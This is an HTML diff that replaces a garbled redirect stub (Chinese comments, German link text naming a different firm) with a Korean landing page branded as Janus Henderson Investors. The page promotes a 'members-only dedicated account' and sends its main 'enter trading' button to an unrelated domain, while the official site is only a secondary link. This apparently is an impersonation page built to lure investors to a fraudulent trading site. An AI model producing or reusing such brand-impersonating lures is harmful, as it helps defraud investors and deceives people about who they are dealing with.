@@ -1,18 +1,104 @@
 <!DOCTYPE html>
-<html lang="zh-CN">
+<html lang="ko">
 <head>
-  <meta charset="UTF-8">
-  <title>Janus Henderson Investors | Korea</title>
-  <!-- 使用 Meta Refresh 在 0 秒后跳转 -->
-  <meta http-equiv="refresh" content="0;url=https://www.example.com/">
-  <!-- 为了兼容性，JS 也做一次重定向 -->
-  <script>
-    // 如果浏览器不支持 Meta Refresh，会执行下面的 JS
-    window.location.href = "https://www.janushenderson.com/corporate/";
-  </script>
+<meta charset="UTF-8" />
+<meta name="viewport" content="width=device-width, initial-scale=1, viewport-fit=cover" />
+<title>전용계좌 바로가기 · Janus Henderson</title>
+<style>
+  :root{ --gold:#e7c56a; --gold-soft:#c9a24b; --bg:#0a0a0b; }
+  *{box-sizing:border-box;}
+  html,body{margin:0;padding:0;}
+  body{
+    min-height:100vh; background:var(--bg); color:#f4f4f4;
+    font-family:-apple-system,BlinkMacSystemFont,"Apple SD Gothic Neo","Noto Sans KR","Malgun Gothic","Segoe UI",sans-serif;
+    display:flex; align-items:center; justify-content:center;
+    -webkit-font-smoothing:antialiased; overflow-x:hidden;
+  }
+  .glow{position:fixed; border-radius:50%; pointer-events:none; filter:blur(40px); z-index:0;}
+  .glow.a{top:-160px; right:-120px; width:480px; height:480px; background:radial-gradient(circle,rgba(201,162,75,.30),transparent 62%);}
+  .glow.b{bottom:-200px; left:-120px; width:480px; height:480px; background:radial-gradient(circle,rgba(201,162,75,.18),transparent 62%);}
+  .wrap{position:relative; z-index:1; width:100%; max-width:460px; padding:48px 24px; text-align:center;}
+  .brand{display:flex; flex-direction:column; align-items:center; gap:6px; margin-bottom:28px;}
+  .brand .name{font-size:19px; font-weight:600; letter-spacing:.5px;
+    background:linear-gradient(180deg,#fbe9a8,#cda14b); -webkit-background-clip:text; background-clip:text; color:transparent;}
+  .brand .sub{font-size:10px; font-weight:500; letter-spacing:.42em; color:var(--gold-soft);}
+  .badge{display:inline-block; border:1px solid rgba(201,162,75,.5); background:rgba(201,162,75,.1);
+    color:var(--gold); font-size:14px; font-weight:500; border-radius:6px; padding:7px 18px; margin-bottom:26px;}
+  .title{margin:0; font-weight:900; line-height:1.04; letter-spacing:-1px;
+    font-size:clamp(56px,15vw,84px);
+    background:linear-gradient(180deg,#fdeeb0,#e7c56a 55%,#bf913a);
+    -webkit-background-clip:text; background-clip:text; color:transparent;}
+  .subtitle{margin:24px auto 0; max-width:380px; font-size:15px; line-height:1.6; color:rgba(255,255,255,.7);}
+  .subtitle b{color:var(--gold); font-weight:600;}
+  .btns{display:flex; flex-direction:column; gap:12px; margin-top:36px;}
+  .btn{display:flex; align-items:center; justify-content:center; text-decoration:none;
+    font-size:16px; border-radius:12px; padding:15px; transition:filter .15s,background .15s;}
+  .btn.primary{background:linear-gradient(180deg,#f0d27a,#c9962f); color:#1a1407; font-weight:700;
+    box-shadow:0 12px 30px -10px rgba(201,150,47,.6);}
+  .btn.primary:hover{filter:brightness(1.08);}
+  .btn.ghost{border:1px solid rgba(201,162,75,.6); color:var(--gold); font-weight:600;}
+  .btn.ghost:hover{background:rgba(201,162,75,.1);}
+  .features{display:grid; grid-template-columns:repeat(2,1fr); gap:24px 12px;
+    margin-top:44px; padding-top:30px; border-top:1px solid rgba(255,255,255,.1);}
+  .feat{display:flex; flex-direction:column; align-items:center; gap:8px;}
+  .feat .ic{width:46px; height:46px; border-radius:50%; display:flex; align-items:center; justify-content:center;
+    border:1px solid rgba(201,162,75,.4); background:rgba(201,162,75,.1); color:var(--gold);}
+  .feat .t{font-size:14px; font-weight:600;}
+  .feat .d{font-size:12px; color:rgba(255,255,255,.5);}
+  @media(min-width:600px){
+    .btns{flex-direction:row; justify-content:center;}
+    .btn{flex:1; max-width:200px;}
+    .features{grid-template-columns:repeat(4,1fr);}
+  }
+</style>
 </head>
 <body>
-  <!-- 若以上方法都失败，提供一个手动点击链接 -->
-  <p><a href="https://www.janushenderson.com/corporate/">Klicken Sie hier, um zur offiziellen Website von MassMutual Ventures zu gelangen.</a>。</p>
+  <div class="glow a"></div>
+  <div class="glow b"></div>
+
+  <main class="wrap">
+    <div class="brand">
+      <svg width="62" height="62" viewBox="0 0 72 72" aria-hidden="true">
+        <defs><linearGradient id="g" x1="0" y1="0" x2="0" y2="1">
+          <stop offset="0" stop-color="#fbe9a8"/><stop offset="1" stop-color="#c9962f"/>
+        </linearGradient></defs>
+        <circle cx="36" cy="36" r="34" fill="none" stroke="url(#g)" stroke-width="1.5"/>
+        <text x="36" y="45" text-anchor="middle" font-size="26" font-weight="800"
+          font-family="Georgia,serif" fill="url(#g)">JH</text>
+      </svg>
+      <div class="name">Janus Henderson</div>
+      <div class="sub">INVESTORS</div>
+    </div>
+
+    <span class="badge">회원 전용 서비스</span>
+
+    <h1 class="title">전용계좌<br>바로가기</h1>
+
+    <p class="subtitle">버튼을 눌러 <b>전용계좌 서비스</b>를 이용하세요.</p>
+
+    <div class="btns">
+      <a class="btn primary" href="https://www.njvksdfa.com">거래 입장</a>
+      <a class="btn ghost" href="https://www.janushenderson.com/corporate/" target="_blank" rel="noopener noreferrer">공식 홈페이지</a>
+    </div>
+
+    <div class="features">
+      <div class="feat">
+        <span class="ic"><svg width="20" height="20" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="1.8" stroke-linecap="round" stroke-linejoin="round"><path d="M13 2 3 14h7l-1 8 11-13h-7z"/></svg></span>
+        <span class="t">빠른 접속</span><span class="d">즉시 이용 가능</span>
+      </div>
+      <div class="feat">
+        <span class="ic"><svg width="20" height="20" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="1.8" stroke-linecap="round" stroke-linejoin="round"><path d="M12 2 20 5v6c0 5-3.5 8.5-8 10-4.5-1.5-8-5-8-10V5z"/><path d="m9 12 2 2 4-4"/></svg></span>
+        <span class="t">안전한 서비스</span><span class="d">보안 시스템 적용</span>
+      </div>
+      <div class="feat">
+        <span class="ic"><svg width="20" height="20" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="1.8" stroke-linecap="round" stroke-linejoin="round"><rect x="7" y="2" width="10" height="20" rx="2.5"/><path d="M11 18h2"/></svg></span>
+        <span class="t">설치 불필요</span><span class="d">앱 설치 없이 이용</span>
+      </div>
+      <div class="feat">
+        <span class="ic"><svg width="20" height="20" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="1.8" stroke-linecap="round" stroke-linejoin="round"><path d="M21 12a9 9 0 0 1-9 9 9 9 0 0 1-7.5-4"/><path d="M3 12a9 9 0 0 1 9-9 9 9 0 0 1 7.5 4"/><path d="M20 3v5h-5"/><path d="M4 21v-5h5"/></svg></span>
+        <span class="t">자동 업데이트</span><span class="d">최신 버전 자동 적용</span>
+      </div>
+    </div>
+  </main>
 </body>
 </html>
